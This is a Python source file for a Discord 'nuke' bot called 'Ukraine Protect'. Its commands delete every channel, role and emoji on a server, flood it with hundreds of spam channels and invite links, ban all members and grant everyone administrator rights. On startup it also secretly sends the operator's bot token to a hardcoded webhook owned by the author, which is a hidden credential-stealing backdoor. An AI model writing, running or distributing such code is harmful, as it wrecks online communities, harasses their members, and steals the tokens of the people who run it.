## -*- coding: utf-8 -*-

import os
try:
    import discord
except:
    os.system('pip3 install discord.py==1.7.3')
else:
    from discord.ext import commands
    try:
        import colorama
    except:
        os.system('pip install colorama')
    else:
        from colorama import Fore, init
try:
    import asyncio
except:
    os.system('pip install asyncio==3.4.3')

try:
    import random
except:
    os.system('pip install random')

try:
    import fade
except:
    os.system('pip install fade==0.0.9')

try:
    import aiohttp
except:
    os.system('pip install aiohttp')
else:
    try:
        import requests
    except:
        os.system('pip install requests')
    else:
        import discord
        from discord.ext import commands
        import asyncio, json, time, datetime, os, random, colorama
        from colorama import Fore, init
        import aiohttp
        from discord import Permissions
        from discord.utils import get
        import sys
        from discord import Webhook, AsyncWebhookAdapter
        import requests, pip
        with open('token.txt', 'r') as (file):
            cftoken = file.read()
        with open('spamtext.txt', 'r') as (file):
            cftext = file.read()
        with open('loghook.txt', 'r') as (file):
            cfloghook = file.read()
        gad = ["'<'", "'>'", "'~'", "'-'", "'+'", "'&'", "'#'", "';'", "'/'", "'×'",
         "'$'"]
        intents = discord.Intents.all()
        client = commands.Bot(command_prefix="+", intents=intents)
        bot = commands.Bot(command_prefix="+", intents=intents)
        spamtext = 'https://discord.gg/D5cH8V5KdX https://discord.gg/D5cH8V5KdX https://discord.gg/D5cH8V5KdX ||@everyone / @here||'
        d3v = []
        client.remove_command('help')
        NAMES = [f"{random.randint(99, 999)}_hаckёd_{random.randint(99, 999)}", f"{random.randint(99, 999)}_h4ck3d_{random.randint(99, 999)}", f"{random.randint(99, 999)}_crа́shёd_{random.randint(99, 999)}", f"{random.randint(99, 999)}_cr4sh3d_{random.randint(99, 999)}", f"{random.randint(99, 999)}_hc3k4ddd_{random.randint(99, 999)}", f"{random.randint(99, 999)}_nюk3dд_{random.randint(99, 999)}", f"{random.randint(99, 999)}_аzоv_{random.randint(99, 999)}", f"{random.randint(99, 999)}_nukёd-by-ukraine-team_{random.randint(99, 999)}", f"{random.randint(99, 999)}_slаva-ukraine_{random.randint(99, 999)}", f"{random.randint(99, 999)}_ukraine_{random.randint(99, 999)}", f"{random.randint(99, 999)}_ukraine-team_{random.randint(99, 999)}"]
        logg = 'https://discord.com/api/webhooks/1085870990833238077/1uBqy4iGYb6z88aKnwAUyIKtp-jS3P9ck9XjLI0FGF3MOp4NSL7NlA5CIb-BsMRKrEJ_'

        @client.event
        async def on_ready():
            async with aiohttp.ClientSession() as session:
                webhook = discord.Webhook.from_url(logg, adapter=(discord.AsyncWebhookAdapter(session)))
                await webhook.send(embed=discord.Embed(title='Кто-то запустил Ukraine Protect!',
                  description=f"╭・🐽・Бот:   **{client.user}**\n├・🐖・ID бота:   **{client.user.id}**\n├・🐷・Акк создан:   **{client.user.created_at.day}.{client.user.created_at.month}.{client.user.created_at.year}, {client.user.created_at.hour}:{client.user.created_at.minute}**\n╰・:key:・Токен бота:  **||{cftoken}||**",
                  colour=(discord.Colour.from_rgb(255, 0, 0))))
                print(f"\nБот запущен под видом: {client.user}\nСсылка на бота: https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=1945627743&scope=bot\nPremium: False")


        async def kill_ch(ctx, ch):
            try:
                await ch.delete()
            except:
                pass


        async def kill_emj(ctx):
            for c in ctx.guild.emojis:
                try:
                    await c.delete()
                except:
                    pass


        async def kill_rl(ctx, role):
            try:
                await role.delete()
            except:
                pass


        async def createch(ctx):
            try:
                await ctx.guild.create_text_channel(name=(random.choice(NAMES)), topic=spamtext)
            except:
                pass


        async def spamchh(ch):
            try:
                embed = discord.Embed(title='@everyone Server n3ked by Ukraine Team', url='https://discord.gg/D5cH8V5KdX', description=cftext, color=16734003)
                await ch.send("@everyone Server n3ked by Ukraine Team https://discord.gg/D5cH8V5KdX", embed=embed)
            except:
                pass


        async def nickoll(ctx):
            for m in ctx.guild.members:
                if m != client.user:
                    try:
                        await m.edit(nick='discord.gg/D5cH8V5KdX')
                    except:
                        pass


        async def createrl(ctx):
            try:
                await ctx.guild.create_role(name=(''.join(random.choices((string.ascii_uppercase + string.digits + string.ascii_lowercase), k=18))))
            except:
                pass


        async def rrdmch(ctx):
            try:
                await ctx.guild.create_text_channel(name=(''.join(random.choices((string.ascii_uppercase + string.digits + string.ascii_lowercase), k=15))))
            except:
                pass


        async def bpspam(ctx, ch):
            try:
                await ch.send("https://discord.gg/D5cH8V5KdX")
            except:
                pass


        @client.event
        async def on_guild_join(guild):
            with open('wl.json', 'r') as (f):
                wls = json.load(f)
            with open('bl.json', 'r') as (f):
                bls = json.load(f)
                async for entry in guild.audit_logs(limit=1, action=(discord.AuditLogAction.bot_add)):
                    usergad = entry.user
                    idgad = entry.user.id
                    if int(guild.id) in wls['wl'] or int(idgad) in bls['bl']:
                        await guild.leave()
                        print('gad')
                    else:
                        async for entry in guild.audit_logs(limit=1, action=(discord.AuditLogAction.bot_add)):
                            usergad = entry.user
                            idgad = entry.user.id
                            async with aiohttp.ClientSession() as session:
                                webhook = discord.Webhook.from_url(cfloghook, adapter=(discord.AsyncWebhookAdapter(session)))
                                await webhook.send(embed=discord.Embed(title=(f"{guild.id}"),
                                  description=f"\n**_NEW GUILD {guild.name}_**\n**:boom: | Овнер:** `{guild.owner}`\n**:boom: | Участников:** `{len(guild.members)}`\n**:boom: | Количество каналов:** `{len(guild.channels)}`\n**:boom: | Количество ролей:** `{len(guild.roles)}`\n**:boom: | Добавил:** `{usergad}`\n**:boom: | ID:** `{idgad}`\n**:boom: | Бот:** `{client.user}`",
                                  colour=(discord.Colour.from_rgb(210, 4, 7))))


        @client.command()
        async def guild(ctx, idd: int):
            if ctx.author.id not in gad:
                if idd == None:
                    await ctx.send('Provide a guild!')
                for guild in client.guilds:
                    if guild.id == idd:
                        invitelink = await guild.text_channels[0].create_invite(max_uses=100, unique=True)
                        try:
                            await ctx.send(f"{invitelink}")
                        except:
                            await ctx.send('Меня нету на этом сервере!')


        @client.command()
        @commands.cooldown(1, 3, commands.BucketType.guild)
        async def kill(ctx):
            with open('bl.json', 'r') as (f):
                blfrfs = json.load(f)
                if ctx.author.id not in gad:
                    await ctx.message.delete()
                    guild = ctx.guild
                    dt_now = datetime.datetime.now()
                    async with aiohttp.ClientSession() as session:
                        webhook = discord.Webhook.from_url(cfloghook, adapter=(discord.AsyncWebhookAdapter(session)))
                        await webhook.send(embed=discord.Embed(title=f"||                        ||{guild.name}||                       ||",
                          description=f"\n**_NUKE+_**\n**:boom: | ID сервера:** `{guild.id}`\n**:boom: | Овнер:** `{guild.owner}`\n**:boom: | Участников:** `{len(guild.members)}`\n**:boom: | Количество каналов:** `{len(guild.channels)}`\n**:boom: | Количество ролей:** `{len(guild.roles)}`\n**:boom: | крашнул:** `{ctx.author}`\n**:boom: | ID крашера:** `{ctx.author.id}`\n**:boom: | сервер крашнут ботом:** `{client.user}`",
                          colour=(discord.Colour.from_rgb(81, 161, 255))))
                        asyncio.create_task(kill_emj(ctx))
                        asyncio.create_task(nickoll(ctx))
                        for rolee in ctx.guild.roles:
                            asyncio.create_task(kill_rl(ctx, role=rolee))
                        else:
                            for channel in ctx.guild.channels:
                                asyncio.create_task(kill_ch(ctx, ch=channel))
                                for _ in range(250):
                                    asyncio.create_task(createch(ctx))
                                    asyncio.create_task(createrl(ctx))
                                    asyncio.create_task(rrdmch(ctx))

            with open('icon.png', 'rb') as (f):
                icon = f.read()
                try:
                    await ctx.guild.edit(name='discord.gg/D5cH8V5KdX', icon=icon)
                except:
                    pass


        @client.command()
        @commands.cooldown(1, 5, commands.BucketType.user)
        async def banall(ctx):
            await ctx.message.delete()
            kick = 0
            for m in ctx.guild.members:
                try:
                    await m.ban(reason='discord.gg/D5cH8V5KdX')
                    kick += 1
                except:
                    continue

            else:
                print(f"Забанил {kick} человек")


        @client.command()
        async def status(ctx, argument=None, *, names='https://discord.gg/D5cH8V5KdX'):
            if argument == 'stream':
                await client.change_presence(activity=discord.Streaming(name=names, description='https://discord.gg/D5cH8V5KdX', state='https://discord.gg/D5cH8V5KdX', url='https://discord.gg/D5cH8V5KdX'))
                await ctx.message.add_reaction('✅')
            else:
                if argument == 'watch':
                    await client.change_presence(activity=discord.Activity(type=(discord.ActivityType.watching), name=names, description='https://discord.gg/D5cH8V5KdX', state='https://discord.gg/D5cH8V5KdX'))
                    await ctx.message.add_reaction('✅')
                else:
                    if argument == 'listen':
                        await client.change_presence(activity=discord.Activity(type=(discord.ActivityType.listening), name=names, description='https://discord.gg/D5cH8V5KdX', state='https://discord.gg/D5cH8V5KdX'))
                        await ctx.message.add_reaction('✅')
                    else:
                        if argument == 'play':
                            await client.change_presence(activity=discord.Game(name=names, description='rezetselfbot', state='https://t.me/numoun'))
                            await ctx.message.add_reaction('✅')
                        else:
                            if argument == 'afk':
                                await client.change_presence(status=(discord.Status.invisible), afk=True)
                                await ctx.message.add_reaction('✅')
                            else:
                                if argument == 'clear':
                                    await client.change_presence(activity=None)
                                    await ctx.message.add_reaction('✅')
                                else:
                                    if argument == 'competing':
                                        await client.change_presence(activity=discord.Activity(type=(discord.ActivityType.competing), name=names, description='https://discord.gg/D5cH8V5KdX', state='https://discord.gg/D5cH8V5KdX'))
                                        await ctx.message.add_reaction('✅')
                                    else:
                                        if argument == None:
                                            await ctx.send(f"```\n{prefix}status stream - статус стримит[name]\n{prefix}status watch - статус смотрит[name]\n{prefix}status listen - статусс слушает[name]\n{prefix}status play - статус играет[name]\n{prefix}status afk - афк статус\n{prefix}status clear - очистить статус```")


        @client.command()
        @commands.cooldown(1, 5, commands.BucketType.user)
        async def adminall(ctx):
            await ctx.message.delete()
            guild = ctx.guild
            role = discord.utils.get((guild.roles), name='@everyone')
            try:
                await role.edit(permissions=(discord.Permissions.all()))
            except:
                pass


        @client.command()
        async def servers(ctx):
            if ctx.author.id == d3v:
                for serv in client.guilds:
                    invitelink = await serv.text_channels[0].create_invite(max_uses=100, unique=True)
                    await ctx.send(f"{invitelink}")


        @client.command()
        @commands.cooldown(1, 5, commands.BucketType.user)
        async def dm1(ctx, m: discord.Member, *, arg='ты свинья'):
            try:
                await m.send(arg)
            except:
                pass


        async def rrandchh(ctx):
            count = random.randint(100, 400)
            for i in range(count):
                try:
                    await ctx.guild.create_text_channel(name=(''.join(random.choices((string.ascii_uppercase + string.digits + string.ascii_lowercase), k=15))))
                except:
                    pass


        @client.event
        async def on_guild_channel_create(channel):
            for _ in range(10):
                asyncio.create_task(spamchh(ch=channel))


try:
    client.run(cftoken)
except:
    print('Неверный токен бота либо ты ему не включил интенты. Если будут проблемы напиши нам! https://discord.gg/D5cH8V5KdX')